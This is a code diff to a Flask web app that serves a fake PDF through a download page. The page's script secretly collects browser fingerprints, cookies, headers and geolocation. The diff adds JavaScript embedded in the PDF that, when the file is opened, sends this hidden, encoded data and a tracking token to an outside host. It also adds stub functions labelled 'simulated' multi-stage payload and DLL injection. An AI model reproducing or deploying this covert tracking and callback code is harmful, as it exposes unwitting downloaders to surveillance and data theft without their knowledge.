@@ -14,6 +14,7 @@ from reportlab.lib.styles import getSampleStyleSheet
 from cryptography.fernet import Fernet
 from stegano import lsb
 from PIL import Image as PILImage
+import PyPDF2
 
 app = Flask(__name__)
 
@@ -34,6 +35,11 @@ CIPHER = Fernet(ENCRYPTION_KEY)
 # Store tokens for verification
 logged_tokens = {}
 
+def get_hidden_message(data):
+    """Return the hidden message wrapped with markers."""
+    encoded = base64.b64encode(json.dumps(data).encode()).decode()
+    return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"
+
 def get_ip_geolocation(ip):
     """Fetch geolocation data from ipinfo.io."""
     try:
@@ -49,37 +55,37 @@ def get_ip_geolocation(ip):
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
 
-def collect_data(request):
+def collect_data(req):
     """Collect client-side and server-side data."""
-    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'unknown')
-    cookies = request.cookies
-    tls_metadata = request.environ.get('wsgi.url_scheme')
+    ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
+    ip = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
+    user_agent = req.headers.get('User-Agent', 'unknown')
+    cookies = req.cookies
+    tls_metadata = req.environ.get('wsgi.url_scheme')
 
     client_data = {
-        'screenWidth': request.form.get('screenWidth'),
-        'screenHeight': request.form.get('screenHeight'),
-        'colorDepth': request.form.get('colorDepth'),
-        'pixelDepth': request.form.get('pixelDepth'),
-        'language': request.form.get('language'),
-        'platform': request.form.get('platform'),
-        'connection': request.form.get('connection'),
-        'pageLoadTime': request.form.get('pageLoadTime'),
-        'clickTime': request.form.get('clickTime'),
-        'dwellTime': request.form.get('dwellTime'),
-        'lastMouseX': request.form.get('lastMouseX'),
-        'lastMouseY': request.form.get('lastMouseY'),
-        'referrer': request.form.get('referrer'),
-        'canvasFingerprint': request.form.get('canvasFingerprint'),
-        'hardwareConcurrency': request.form.get('hardwareConcurrency'),
-        'deviceMemory': request.form.get('deviceMemory'),
-        'timezoneOffset': request.form.get('timezoneOffset'),
-        'touchSupport': request.form.get('touchSupport'),
-        'batteryLevel': request.form.get('batteryLevel'),
-        'charging': request.form.get('charging'),
-        'downlink': request.form.get('downlink'),
-        'plugins': request.form.get('plugins')
+        'screenWidth': req.form.get('screenWidth'),
+        'screenHeight': req.form.get('screenHeight'),
+        'colorDepth': req.form.get('colorDepth'),
+        'pixelDepth': req.form.get('pixelDepth'),
+        'language': req.form.get('language'),
+        'platform': req.form.get('platform'),
+        'connection': req.form.get('connection'),
+        'pageLoadTime': req.form.get('pageLoadTime'),
+        'clickTime': req.form.get('clickTime'),
+        'dwellTime': req.form.get('dwellTime'),
+        'lastMouseX': req.form.get('lastMouseX'),
+        'lastMouseY': req.form.get('lastMouseY'),
+        'referrer': req.form.get('referrer'),
+        'canvasFingerprint': req.form.get('canvasFingerprint'),
+        'hardwareConcurrency': req.form.get('hardwareConcurrency'),
+        'deviceMemory': req.form.get('deviceMemory'),
+        'timezoneOffset': req.form.get('timezoneOffset'),
+        'touchSupport': req.form.get('touchSupport'),
+        'batteryLevel': req.form.get('batteryLevel'),
+        'charging': req.form.get('charging'),
+        'downlink': req.form.get('downlink'),
+        'plugins': req.form.get('plugins')
     }
 
     lat, lon, geo_data = get_ip_geolocation(ip)
@@ -92,7 +98,7 @@ def collect_data(request):
         'user_agent': user_agent,
         'action': 'Downloaded PDF',
         'client_data': client_data,
-        'request_headers': dict(request.headers),
+        'request_headers': dict(req.headers),
         'cookies': cookies,
         'tls_metadata': tls_metadata
     }
@@ -101,7 +107,7 @@ def collect_data(request):
 def embed_data_in_image(data):
     """Embed encrypted data in an image using steganography."""
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
-    # Create a larger base image (500x500) to increase the capacity for the hidden message.
+    # Create a larger base image (500x500) for more capacity.
     base_img = PILImage.new('RGB', (500, 500), color='white')
     temp_path = 'temp_base.png'
     base_img.save(temp_path)
@@ -109,8 +115,25 @@ def embed_data_in_image(data):
     os.remove(temp_path)
     return stego_img
 
+def simulate_multi_stage_payload(data):
+    """Simulate multi-stage payload delivery (for demonstration only)."""
+    logging.info("Simulating multi-stage payload delivery with data: " + json.dumps(data))
+    stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
+    # Simulate a secondary stage
+    stage_payload["stage"] = "secondary"
+    stage_payload["info"] = "Additional stage executed"
+    logging.info("Simulated multi-stage payload: " + json.dumps(stage_payload))
+    return stage_payload
+
+def simulate_dll_injection():
+    """Simulate a DLL injection (for demonstration only)."""
+    logging.info("Simulated DLL injection executed (defensive demonstration only)")
+    return "DLL injection simulated"
+
 def generate_pdf(logged_data):
-    """Generate a PDF with fake content and embedded steganographic data."""
+    """Generate a PDF with fake content and embedded steganographic data.
+    Afterwards, add custom metadata and embedded JavaScript callbacks via PyPDF2."""
+    # Build PDF using Platypus
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
@@ -119,7 +142,6 @@ def generate_pdf(logged_data):
     # Fake content
     story.append(Paragraph("Fake PDF Document", styles['Title']))
     story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
-    # Precompute address to avoid f-string backslash issues.
     address = fake.address().replace('\n', ', ')
     story.append(Paragraph(f"Address: {address}", styles['Normal']))
     story.append(Paragraph("Additional Info:", styles['Normal']))
@@ -139,9 +161,48 @@ def generate_pdf(logged_data):
 
     doc.build(story)
     buffer.seek(0)
-    return buffer, token
+    
+    # Now add extra metadata and JavaScript via PyPDF2.
+    hidden_message = get_hidden_message(logged_data)
+    reversed_token = token[::-1]
+    
+    pdf_reader = PyPDF2.PdfReader(buffer)
+    pdf_writer = PyPDF2.PdfWriter()
+    for page in pdf_reader.pages:
+        pdf_writer.add_page(page)
+    # Add custom metadata containing the hidden message.
+    pdf_writer.add_metadata({'/HiddenData': hidden_message})
+    
+    # Embed JavaScript callbacks.
+    js_code = f"""
+    // Primary callback: send hidden message to the server.
+    try {{
+        var req1 = new XMLHttpRequest();
+        req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
+        req1.onload = function() {{
+            app.alert("Primary callback result: " + req1.responseText);
+        }};
+        req1.send();
+        // Secondary callback: send the reversed token (which is reversed back) to a second endpoint.
+        var reversedToken = "{reversed_token}";
+        var token = reversedToken.split("").reverse().join("");
+        var req2 = new XMLHttpRequest();
+        req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
+        req2.onload = function() {{
+            app.alert("Secondary callback result: " + req2.responseText);
+        }};
+        req2.send();
+    }} catch(e) {{
+        app.alert("Error in callbacks: " + e);
+    }}
+    """
+    pdf_writer.add_js(js_code)
+    
+    new_buffer = BytesIO()
+    pdf_writer.write(new_buffer)
+    new_buffer.seek(0)
+    return new_buffer, token
 
-# HTML page with a styled download button and embedded JavaScript to capture client-side data.
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -172,7 +233,6 @@ HTML_PAGE = """
     <h1>Click to Download PDF and Log Your Data</h1>
     <form id="downloadForm" action="/download" method="post">
         <button type="submit">Download PDF</button>
-        <!-- Hidden fields for basic client-side data -->
         <input type="hidden" name="screenWidth" id="screenWidth">
         <input type="hidden" name="screenHeight" id="screenHeight">
         <input type="hidden" name="colorDepth" id="colorDepth">
@@ -186,7 +246,6 @@ HTML_PAGE = """
         <input type="hidden" name="lastMouseX" id="lastMouseX">
         <input type="hidden" name="lastMouseY" id="lastMouseY">
         <input type="hidden" name="referrer" id="referrer">
-        <!-- Hidden fields for advanced client-side data -->
         <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
         <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
         <input type="hidden" name="deviceMemory" id="deviceMemory">
@@ -198,23 +257,16 @@ HTML_PAGE = """
         <input type="hidden" name="plugins" id="plugins">
     </form>
     <br>
-    <!-- Link to view logs (for admin/development only) -->
     <a href="/logs">View Logged Data</a>
     <script>
-        // Record page load time
         var pageLoadTime = Date.now();
         document.getElementById('pageLoadTime').value = pageLoadTime;
-        
-        // Capture last mouse position
         var lastMouseX = 0, lastMouseY = 0;
         document.addEventListener('mousemove', function(e) {
             lastMouseX = e.clientX;
             lastMouseY = e.clientY;
         });
-        
-        // Function to gather extra client data
         function gatherExtraData(callback) {
-            // Canvas fingerprinting
             var canvas = document.createElement("canvas");
             var ctx = canvas.getContext("2d");
             ctx.textBaseline = "top";
@@ -224,29 +276,21 @@ HTML_PAGE = """
             ctx.fillStyle = "#069";
             ctx.fillText("Hello, world!", 2, 15);
             document.getElementById('canvasFingerprint').value = canvas.toDataURL();
-            
-            // Hardware and system details
             document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
             document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
             document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
             document.getElementById('touchSupport').value = ('ontouchstart' in window) ? true : false;
-            
-            // Installed plugins
             if (navigator.plugins) {
                 var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
                 document.getElementById('plugins').value = plugins.join(', ');
             } else {
                 document.getElementById('plugins').value = '';
             }
-            
-            // Network downlink info
             if (navigator.connection && navigator.connection.downlink) {
                 document.getElementById('downlink').value = navigator.connection.downlink;
             } else {
                 document.getElementById('downlink').value = '';
             }
-            
-            // Battery information
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
                     document.getElementById('batteryLevel').value = battery.level;
@@ -263,11 +307,8 @@ HTML_PAGE = """
                 callback();
             }
         }
-        
-        // Intercept form submission to capture client-side data
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            // Populate basic hidden fields
             document.getElementById('screenWidth').value = screen.width;
             document.getElementById('screenHeight').value = screen.height;
             document.getElementById('colorDepth').value = screen.colorDepth;
@@ -285,8 +326,6 @@ HTML_PAGE = """
             document.getElementById('dwellTime').value = clickTime - pageLoadTime;
             document.getElementById('lastMouseX').value = lastMouseX;
             document.getElementById('lastMouseY').value = lastMouseY;
-            
-            // Gather extra data then submit the form
             gatherExtraData(function() {
                 e.target.submit();
             });
@@ -302,11 +341,16 @@ def index():
 
 @app.route('/download', methods=['POST'])
 def download():
-    # Collect and log initial data
     logged_data = collect_data(request)
     logging.info(json.dumps(logged_data))
+    
+    multi_stage_result = simulate_multi_stage_payload(logged_data)
+    dll_injection_result = simulate_dll_injection()
+    logged_data["simulation"] = {
+        "multi_stage": multi_stage_result,
+        "dll_injection": dll_injection_result
+    }
 
-    # Generate PDF with embedded data and verification token
     pdf_buffer, token = generate_pdf(logged_data)
     logged_tokens[token] = logged_data
 
@@ -314,13 +358,25 @@ def download():
 
 @app.route('/verify', methods=['GET'])
 def verify():
-    """Handle PDF open verification via token."""
     token = request.args.get('token')
     if token in logged_tokens:
         logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
-        # Optionally remove token after verification
         del logged_tokens[token]
         return "Thank you!", 200
+    return "Invalid token", 400
+
+@app.route('/pdf_callback', methods=['GET'])
+def pdf_callback():
+    hidden_data = request.args.get('data', '')
+    logging.info("Primary PDF callback triggered with data: " + hidden_data)
+    return "Primary callback logged", 200
+
+@app.route('/pdf_callback_stage2', methods=['GET'])
+def pdf_callback_stage2():
+    token = request.args.get('token', '')
+    if token in logged_tokens:
+        logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
+        return "Stage2 callback logged", 200
     return "Invalid token", 400
 
 @app.route('/logs')
@@ -350,6 +406,10 @@ def display_logs():
     </html>
     """
     return render_template_string(logs_html, logs=logs)
+
+@app.route('/simulate')
+def simulate():
+    return "Simulation endpoint", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
